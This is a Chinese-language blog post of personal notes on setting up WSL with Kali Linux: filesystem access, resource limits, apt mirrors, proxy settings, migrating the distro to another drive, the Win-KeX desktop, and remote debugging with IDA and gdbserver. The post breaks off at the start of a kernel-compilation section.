<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali<span class="literal">-linux</span>&gt; <span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">Path</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali<span class="literal">-linux</span></span><br></pre></td></tr></table></figure>
<p>这到底是个啥地方呢?前面怎么好长一坨,FileSystem后面还有俩冒号</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\<span class="number">86135</span>&gt; <span class="built_in">cd</span> \\wsl.localhost\kali<span class="literal">-linux</span></span><br><span class="line"><span class="built_in">PS</span> Microsoft.PowerShell.Core\FileSystem::\\wsl.localhost\kali<span class="literal">-linux</span>&gt;</span><br></pre></td></tr></table></figure>
<p>如果在这个目录下面,想使用cd ..退到爹目录,接着说找不到爹目录</p>
<p>实际上可以直接用explorer访问wsl的文件系统</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716105512580.png"
alt="image-20220716105512580" />
<figcaption aria-hidden="true">image-20220716105512580</figcaption>
</figure>
<h3 id="wsl上windows的位置">wsl上windows的位置</h3>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135/Desktop/pwn]</span><br><span class="line">└─# <span class="built_in">pwd</span></span><br><span class="line">/mnt/c/Users/86135/Desktop/pwn</span><br></pre></td></tr></table></figure>
<p>即windows的根目录在wsl上为<code>/mnt/</code></p>
<p>比如桌面就是<code>/mnt/c/Users/86135/Desktop/</code></p>
<p>D盘就是<code>/mnt/d/</code></p>
<h2 id="共享环境变量">共享环境变量</h2>
<p>在wsl上可以调用windows的环境变量中的应用程序</p>
<p>不同于windows终端的是,wsl上调用win的应用需要.exe后缀</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# ipconfig</span><br><span class="line">-bash: ipconfig: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# ipconfig.exe</span><br><span class="line"></span><br><span class="line">Windows IP 配置</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">以太网适配器 以太网:</span><br><span class="line"></span><br><span class="line">   媒体状态  . . . . . . . . . . . . : 媒体已断开连接</span><br><span class="line">   ...</span><br></pre></td></tr></table></figure>
<p>也可以用wsl打开主系统中已经添加到环境变量的窗口应用程序</p>
<p>也可以在wsl上调用主系统的cmd,切换到主系统的cmd终端</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# cmd.exe</span><br><span class="line"><span class="string">&#x27;\\wsl.localhost\kali-linux\root&#x27;</span></span><br><span class="line">用作为当前目录的以上路径启动了 CMD.EXE。</span><br><span class="line">UNC 路径不受支持。默认值设为 Windows 目录。</span><br><span class="line">Microsoft Windows [版本 10.0.22000.675]</span><br><span class="line">(c) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">C:\Windows&gt;</span><br></pre></td></tr></table></figure>
<p>至于两个系统的终端怎么怎么联系.</p>
<p>这都是茴香豆的n种写法,不会有人闲的让终端之间踢皮球吧</p>
<p>并且还有设置开关这些功能,我寻思多多益善吧,不冲突关他干啥呢</p>
<h2 id="wsl执行linux命令">wsl执行linux命令</h2>
<p>正常情况下,linux上的可执行程序.elf或者.out,在windows上是没法执行的.同理win上的.exe也无法在linux上执行</p>
<p>而wsl就提供了一种在windows上执行linux可执行目标文件的方法</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">用法: wsl.exe [参数] [选项...] [命令行]</span><br><span class="line"></span><br><span class="line">运行 Linux 二进制文件的参数:</span><br><span class="line"></span><br><span class="line">    如果未提供命令行，wsl.exe 将启动默认 shell。</span><br><span class="line"></span><br><span class="line">    --exec, -e &lt;命令行&gt;</span><br><span class="line">        在不使用默认 Linux Shell 的情况下执行指定的命令。</span><br><span class="line"></span><br><span class="line">    --</span><br><span class="line">        按原样传递其余命令行。</span><br></pre></td></tr></table></figure>
<p>比如</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\pwn&gt; ls -l</span><br><span class="line">Get-ChildItem : 缺少参数“LiteralPath”的某个参数。请指定一个类型为“System.String[]”的参数，然后再试一次。</span><br><span class="line">所在位置 行:1 字符: 4</span><br><span class="line">+ ls -l</span><br><span class="line">+    ~~</span><br><span class="line">    + CategoryInfo          : InvalidArgument: (:) [Get-ChildItem]，ParameterBindingException</span><br><span class="line">    + FullyQualifiedErrorId : MissingArgument,Microsoft.PowerShell.Commands.GetChildItemCommand</span><br><span class="line"></span><br><span class="line">PS C:\Users\86135\Desktop\pwn&gt; wsl ls -l</span><br><span class="line">total 108</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun  2 19:52 CGfsb</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 19 23:14 cgpwn</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 20 09:55 dice_game</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 19 23:09 forgot</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 17:45 get_shell</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 20 09:28 guess_num</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 09:51 hello_pwn</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 20 08:45 int_overflow</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 17:38 level0</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 11 21:08 level2</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun  3 16:27 level3</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 21 10:30 mytest</span><br><span class="line">-rwxrwxrwx 1 kali kali 84286 Jun  3 16:10 pwn.md</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 19 23:38 reactor</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 20 00:28 realtime</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun 20 10:06 stack2</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 Jun  3 10:56 string</span><br><span class="line">drwxrwxrwx 1 kali kali  4096 May 29 16:03 testPIE</span><br></pre></td></tr></table></figure>
<p>在输入<code>wsl ls -l</code>命令之后终端等了好长时间去了,推测是启动子系统去了.</p>
<p>估计这个过程就是在子系统上运行了<code>ls -l</code>命令之后,将结果反馈给powershell,然后powershell打印到屏幕上</p>
<h2 id="高级配置">高级配置</h2>
<p>wsl上两个配置文件<code>wsl.conf</code> <code>.wslconfig</code></p>
<p>微软给出的这两个文件的描述</p>
<blockquote>
<p><strong>wsl.conf</strong></p>
<ul>
<li>作为 unix 文件存储在 <code>/etc</code> 分发目录中。</li>
<li>用于按分布配置设置。
在此文件中配置的设置将仅应用于包含存储此文件的目录的特定 Linux
分发版。</li>
<li>可用于版本、WSL 1 或 WSL 2 运行的分发版。</li>
<li>若要访问已安装的发行版的 <code>/etc</code>
目录，请使用发行版的命令行和 <code>cd /</code> 访问根目录，然后使用
<code>ls</code> 列出文件或使用 <code>explorer.exe .</code> 在 Windows
文件资源管理器中查看。 目录路径应如下所示：
<code>/etc/wsl.conf</code></li>
</ul>
<p><strong>.wslconfig</strong></p>
<ul>
<li>存储在 <code>%UserProfile%</code> 目录中。</li>
<li>用于全局配置作为 WSL 2 版本运行的所有已安装 Linux
分发版的设置。</li>
<li>仅适用于 <strong>WSL 2 运行的分发</strong>版。 作为 WSL 1
运行的分发版不会受到此配置的影响，因为它们未作为虚拟机运行。</li>
<li>要访问 <code>%UserProfile%</code> 目录，请在 PowerShell 中使用
<code>cd ~</code> 访问主目录（通常是用户配置文件
<code>C:\Users\&lt;UserName&gt;</code>），或者可以打开 Windows
文件资源管理器并在地址栏中输入 <code>%UserProfile%</code>。
目录路径应如下所示：
<code>C:\Users\&lt;UserName&gt;\.wslconfig</code></li>
</ul>
</blockquote>
<p>这两个文件在默认情况下是不存在的,只有我们需要修改wsl的参数时,才需要在相应位置建立这么一个文件.</p>
<p><code>wsl</code>再启动时就会考虑这些文件里的规定了</p>
<p><code>wsl.conf</code>放在子系统里</p>
<p><code>.wslconfig</code>放在主系统里.</p>
<p>在使用wmware的时候,我们可以自由决定虚拟机占用多大内存,最多使用多少个处理器,这就是<code>.wslconfig</code>的作用</p>
<p>在修改之前,首先在wsl上观察一下处理器数量</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/cpuinfo | grep name | <span class="built_in">cut</span> -f2 -d: | <span class="built_in">uniq</span> -c</span><br><span class="line">     16  11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz</span><br></pre></td></tr></table></figure>
<p>wsl显示有16个,现在修改<code>.wslconfig</code>给他改成8个</p>
<p>观察一下总内存大小</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/mnt/c/Users/86135]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/meminfo | grep MemTotal</span><br><span class="line">MemTotal:       16262436 kB</span><br></pre></td></tr></table></figure>
<p>现在修改<code>.wslconfig</code>文件,调整上面两个值</p>
<p><code>C:\Users\86135\.wslconfig</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Settings apply across all Linux distros running on WSL 2</span></span><br><span class="line">[<span class="type">wsl2</span>]			<span class="comment">#正文第一行必须是[wsl2]这种标记</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Limits VM memory to use no more than 4 GB, this can be set as whole numbers using GB or MB</span></span><br><span class="line">memory=<span class="number">4</span>GB 	<span class="comment">#限制内存最大4G</span></span><br><span class="line">	</span><br><span class="line"><span class="comment"># Sets the VM to use two virtual processors</span></span><br><span class="line">processors=<span class="number">8</span>		<span class="comment">#设置8个处理器</span></span><br></pre></td></tr></table></figure>
<p>调整后保存,子系统重启,再打印观察</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/meminfo | grep MemTotal</span><br><span class="line">MemTotal:        4017200 kB</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# <span class="built_in">cat</span> /proc/cpuinfo | grep name | <span class="built_in">cut</span> -f2 -d: | <span class="built_in">uniq</span> -c</span><br><span class="line">      8  11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz</span><br></pre></td></tr></table></figure>
<p>发现刚才的修改确实奏效了</p>
<h2 id="换下载源">换下载源</h2>
<p>首先备份原来的源</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# <span class="built_in">mv</span> /etc/apt/sources.list /etc/apt/sources.list.bak</span><br></pre></td></tr></table></figure>
<p>将该文件修改为阿里云的源</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">deb https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src https://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<p>修改之后可以<code>apt update</code>看看成功没</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# vim /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">┌──(root㉿Executor)-[~]</span><br><span class="line">└─# apt update</span><br><span class="line">Get:1 https://mirrors.aliyun.com/kali kali-rolling InRelease [30.6 kB]</span><br><span class="line">Get:2 https://mirrors.aliyun.com/kali kali-rolling/main Sources [14.7 MB]</span><br><span class="line">Get:3 https://mirrors.aliyun.com/kali kali-rolling/non-free Sources [128 kB]</span><br><span class="line">Get:4 https://mirrors.aliyun.com/kali kali-rolling/contrib Sources [73.1 kB]</span><br><span class="line">Get:5 https://mirrors.aliyun.com/kali kali-rolling/main amd64 Packages [18.4 MB]</span><br><span class="line">Get:6 https://mirrors.aliyun.com/kali kali-rolling/non-free amd64 Packages [213 kB]</span><br><span class="line">Get:7 https://mirrors.aliyun.com/kali kali-rolling/contrib amd64 Packages [116 kB]</span><br><span class="line">Fetched 33.6 MB <span class="keyword">in</span> 22s (1,505 kB/s)</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree... Done</span><br><span class="line">Reading state information... Done</span><br><span class="line">257 packages can be upgraded. Run <span class="string">&#x27;apt list --upgradable&#x27;</span> to see them.</span><br></pre></td></tr></table></figure>
<h2 id="设置代理">设置代理</h2>
<p>找个好地方<code>vim bash_profile</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">export http_proxy=http://172.25.144.1:7891/</span><br><span class="line">export https_proxy=http://172.25.144.1:7891/</span><br></pre></td></tr></table></figure>
<p>这里172.25.144.1是我windows本机的wsl网卡地址,这玩意儿可以在<code>/etc/resolv.conf</code>查看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home]</span><br><span class="line">└─# cat /etc/resolv.conf</span><br><span class="line"># This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:</span><br><span class="line"># [network]</span><br><span class="line"># generateResolvConf = false</span><br><span class="line">nameserver 172.25.144.1</span><br></pre></td></tr></table></figure>
<p>端口号为啥是7891呢,因为我本机clash在7891上开的代理端口</p>
<p>注意clash开允许局域网,系统代理</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20240321233234943.png"
alt="image-20240321233234943" />
<figcaption aria-hidden="true">image-20240321233234943</figcaption>
</figure>
<p>写完了bash_profile之后保存退出,然后<code>source bash_profile</code></p>
<p><strong>这样对于本终端就已经更换了代理,重新开机或者打开其他终端都没有此设置</strong></p>
<h2 id="wsl迁移">wsl迁移</h2>
<p>kali-linux迁移前的C卷大小</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716102545759.png"
alt="image-20220716102545759" />
<figcaption aria-hidden="true">image-20220716102545759</figcaption>
</figure>
<p>由于我想为kali安装一个xfce桌面,KDE桌面很大,又要剥削压迫C卷,于是就像把wsl搬到D卷</p>
<p>先用安装了python3的ubuntu20.04LTS做了一个实验,结果迁移后的ubuntu还是有python3的,这意味着以前的修改都会保留</p>
<p>kali-linux迁移过程:</p>
<h3 id="wsl关机">1.wsl关机</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --shutdown</span><br></pre></td></tr></table></figure>
<h3 id="选好目的地">2.选好目的地</h3>
<p>我将D:,加一个wsl父目录是因为,同父目录下还有D:,将powershell的当前工作目录调整到D:</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\wsl\kali&gt; <span class="built_in">pwd</span></span><br><span class="line"></span><br><span class="line">Path</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">D:\wsl\kali</span><br></pre></td></tr></table></figure>
<h3 id="选择需要导出的子系统">3.选择需要导出的子系统</h3>
<p>使用<code>wsl -l</code>指令列出所有已经注册的子系统名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\wsl\kali&gt; wsl <span class="literal">-l</span></span><br><span class="line">适用于 Linux 的 Windows 子系统分发版:</span><br><span class="line">kali<span class="literal">-linux</span> (默认)</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure>
<h3 id="导出kali-linux.tar">4.导出<code>kali-linux.tar</code></h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --export &lt;子系统名&gt; &lt;tar包路径&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS D:\wsl\kali&gt; wsl --export kali-linux ./kali.tar</span><br></pre></td></tr></table></figure>
<p>本条命令的意义是,将名为kali-linux的子系统,导出到当前工作目录下的kali.tar中</p>
<h3
id="卸载本来安装在c卷的kali-linux">5.卸载本来安装在C卷的kali-linux</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --unregister &lt;子系统名&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS D:\wsl\kali&gt; wsl --unregister kali-linux</span><br><span class="line">正在注销...</span><br></pre></td></tr></table></figure>
<h3 id="导入迁移到d卷的kali-linux">6.导入迁移到D卷的kali-linux</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl --import &lt;子系统名&gt; &lt;子系统安装路径&gt; &lt;tar包路径&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> D:\wsl\kali&gt; wsl <span class="literal">--import</span> kali<span class="literal">-linux</span> . ./kali.tar</span><br></pre></td></tr></table></figure>
<p>本条命令的意义是,从当前目录的kali.tar包导入子系统到当前目录,子系统名叫kali-linux</p>
<h3 id="验证导出成功">7.验证导出成功</h3>
<p>终端启动kali成功</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716103913136.png"
alt="image-20220716103913136" />
<figcaption aria-hidden="true">image-20220716103913136</figcaption>
</figure>
<p>虽然迁移kali只给C省出了3G的磁盘空间...</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716103955718.png"
alt="image-20220716103955718" />
<figcaption aria-hidden="true">image-20220716103955718</figcaption>
</figure>
<p>但是可以放心安装桌面了</p>
<h2 id="安装桌面">安装桌面</h2>
<p>在此之前需要保证wsl升级到wsl2,换下载源到阿里云(如果梯子流量管够忽略)</p>
<h3 id="安装win-kex">安装Win-KeX</h3>
<blockquote>
<p>Win-KeX是windows为kali专门提供的桌面体验,具有以下功能</p>
<ul>
<li>窗口模式：在专用窗口中启动Kali Linux桌面</li>
<li>无缝模式：在Windows和Kali应用程序和菜单之间共享Windows桌面</li>
<li>声音支持</li>
<li>无特权和根会话支持</li>
<li>共享剪贴板，可在Kali Linux和Windows应用之间进行剪切和粘贴支持</li>
<li>多会话支持：根窗口和非私有窗口以及无缝会话同时进行</li>
</ul>
</blockquote>
<p>安装之前先<code>apt update</code>更新一下</p>
<p>之后安装Win-KeX</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y kali-win-kex</span><br></pre></td></tr></table></figure>
<p>安装可能很慢...但是速度是百度云盘两倍(比烂是吧)</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716104931612.png"
alt="image-20220716104931612" />
<figcaption aria-hidden="true">image-20220716104931612</figcaption>
</figure>
<p>安装完成后在kali上使用kex命令,输入一些密码之后,就可以使用xfce桌面了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220716114030667.png"
alt="image-20220716114030667" />
<figcaption aria-hidden="true">image-20220716114030667</figcaption>
</figure>
<p>在kex中使用F8键可以选择桌面以windows窗口运行还是全屏运行,</p>
<p>全屏时就和真的kali系统没有区别了,所有键鼠命令都会被kali捕获,不会发往windows</p>
<p>F8的fullscreen可以设置窗口或者全屏模式</p>
<h2 id="完整everything">完整everything</h2>
<p>一开始安装的子系统只是最小安装,只安装了一个系统,各种武器都没有安装</p>
<p>kali子系统完整安装</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install kali-linux-everything</span><br></pre></td></tr></table></figure>
<p>大约有20个G,还是在学校wifi环境下安装吧,使用流量划不来</p>
<h2 id="idawsl远程调试">ida+wsl远程调试</h2>
<p>终于会动态调试了</p>
<p>但是windows上的IDA似乎只能用local windows
debugger,其他的各种各样的设置看了就烦</p>
<p>今天终于不厌其烦试了试IDA+remote linux debugger在ida上调试elf文件</p>
<p>终于调通了</p>
<p>需要ida,wsl</p>
<h3 id="remote-linux-debugger">remote linux debugger</h3>
<p>win11+wsl kali+ida</p>
<p><code>IDA-&lt;version&gt;/dbgsrv/</code>这个目录下面有调试需要使用的文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901163211166.png"
alt="image-20220901163211166" />
<figcaption aria-hidden="true">image-20220901163211166</figcaption>
</figure>
<p>如果要使用linux远程调试elf文件,需要linux_server和linux_server64两个文件,把他俩复制到kali的文件系统中去</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# ls -l | grep linux</span><br><span class="line">-rwxrwxrwx 1 root root 783792 Jan  1  2021 linux_server</span><br><span class="line">-rwxrwxrwx 1 root root 735376 Jan  1  2021 linux_server64</span><br></pre></td></tr></table></figure>
<p>cd 到该目录下,修改其权限</p>
<p>可以使用--help看linux_server的用法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 linux_server</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# ./linux_server --help</span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Usage: linux_server [options]</span><br><span class="line">  -p ...  (--port-number ...) Port number</span><br><span class="line">  -i ...  (--ip-address ...) IP address to bind to (default to any)</span><br><span class="line">  -s      (--use-tls) Use TLS</span><br><span class="line">  -c ...  (--certchain-file ...) TLS certificate chain file</span><br><span class="line">  -k ...  (--privkey-file ...) TLS private key file</span><br><span class="line">  -v      (--verbose) Verbose mode</span><br><span class="line">  -P ...  (--password ...) Password</span><br><span class="line">  -k      (--on-broken-connection-keep-session) Keep debugger session alive when connection breaks</span><br><span class="line">  -K      (--on-stop-kill-process) Kill debuggee when closing session</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>执行linux_server</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Executor)-[/home/kali]</span><br><span class="line">└─# ./linux_server</span><br><span class="line">IDA Linux 32-bit remote debug server(ST) v7.5.26. Hex-Rays (c) 2004-2020</span><br><span class="line">Listening on 0.0.0.0:23946...</span><br></pre></td></tr></table></figure>
<p>此时kali已经在监听其23946端口了</p>
<p>现在用ida打开一个32位elf程序,F9或者点击Debugger下拉菜单,选择调试器Remote
Linux debugger</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901163954709.png"
alt="image-20220901163954709" />
<figcaption aria-hidden="true">image-20220901163954709</figcaption>
</figure>
<p>然后调试运行(ida默认也是访问远程主机的23946端口,如果不是则这里肯定联不通,ida会让重新设置端口的)</p>
<p>必然会报错找不到输入文件,</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901164111650.png"
alt="image-20220901164111650" />
<figcaption aria-hidden="true">image-20220901164111650</figcaption>
</figure>
<p>一看报错信息,原来输入文件是从远程linux上找的,当然找不到</p>
<p>OK之后ida提供了替代方案</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901164214375.png"
alt="image-20220901164214375" />
<figcaption aria-hidden="true">image-20220901164214375</figcaption>
</figure>
<p>点这个Use
found就可以使用本机的<code>C:\Users\86135\Desktop\malloc\main</code>作为输入文件了</p>
<p>但是调试界面刚出来又没了,原来是忘记下断点了</p>
<p>在main函数(或者其他地方)下断点,然后重新调试运行,可以调试了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220901164532437.png"
alt="image-20220901164532437" />
<figcaption aria-hidden="true">image-20220901164532437</figcaption>
</figure>
<p>甚至可以使用F5反汇编,显然是linux上的光棍儿gdb做不到的</p>
<h3 id="remote-gbd-debugger">remote gbd debugger</h3>
<p>既然linux上也有gdb,那么是不是也可以用远程gdb调试呢?确实能调通,安一个gdbserver剩下的随便拾到拾到就行了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install gdbserver</span><br></pre></td></tr></table></figure>
<p>/usr/src/WSL2-Linux-Kernel-linux-msft-wsl-5.15.137.3/arch/x86/boot/bzImage</p>
<h2 id="编译内核">编译内核</h2>
<p>如果用普通的linux内核直接编译,然后给wsl换这个普通内核,这样wsl起不来</p>
<p>编译wsl内核需要有专门的config文件</p>
<p>内核源码可以用原版的,比如到这里下载<a
target="_blank" rel="noopener" href="https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/">Index of
/pub/linux/kernel/v5.x/</a></p>
<p>以5.8.13为例,</p>
